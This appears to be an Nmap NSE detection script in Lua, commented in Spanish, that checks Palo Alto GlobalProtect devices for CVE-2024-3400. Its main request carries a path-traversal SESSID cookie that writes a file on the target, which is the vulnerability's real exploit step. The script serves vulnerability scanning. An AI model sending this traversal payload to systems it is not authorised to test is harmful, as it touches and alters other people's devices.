-- Required Lua libraries
local http = require "http"
local stdnse = require "stdnse"
local shortport = require "shortport"
local string = require "string"
local rand = require "rand"

description =  [[
CVE-2024-3400 - Identificacion de equipos PALO ALTO afectados por esta vulnerabilidad.
]]

author = "Jorge Caballero - CYBERTEMPLAR"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"safe", "vulnerability"}




-- Regla para definir los puertos que utilizara el script
-- portrule = shortport.port_or_service({80, 443}, {"http", "https"}, "tcp") -- restringe el scan a estos puertos. agregar alternativos
portrule = function(host, port)
    return (port.service ~= nil and (port.service == "http" or port.service == "https"))
end



-- Main
action = function(host, port)
    local path = "/ssl-vpn/hipreport.esp"
    -- random_string
    local random_string = rand.random_alpha(8) -- "a01sda01sd"--stdnse.generate_random_string(10) -- PUNTO A MODIFICAR, no me acepta el comando RAND
    local bad_cookie = "SESSID=/../../../var/appweb/sslvpndocs/global-protect/portal/images/" .. random_string .. ".txt;"
    
    -- Envia una peticion HTTP POST para intentar la explotacion.
    local response = http.post(host, port, path, {
        headers = {
            ["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
            ["Content-Type"] = "application/x-www-form-urlencoded",
            ["Cookie"] = bad_cookie
        },
        body = "test_data=test"
    })

    -- Prueba la vulnerabilidad en el servidor.
    if response.status == 200 then
        local path_check = "/global-protect/portal/images/" .. random_string .. ".txt"
        local check_response = http.get(host, port, path_check)
        if check_response.status == 403 or check_response.status == 404 then
            return stdnse.format_output(true, "Host (".. host.ip ..  ") Potencialmente vulnerable.")
        end
    end

    return stdnse.format_output(false, "No se encontro la vulnerabilidad.")
end



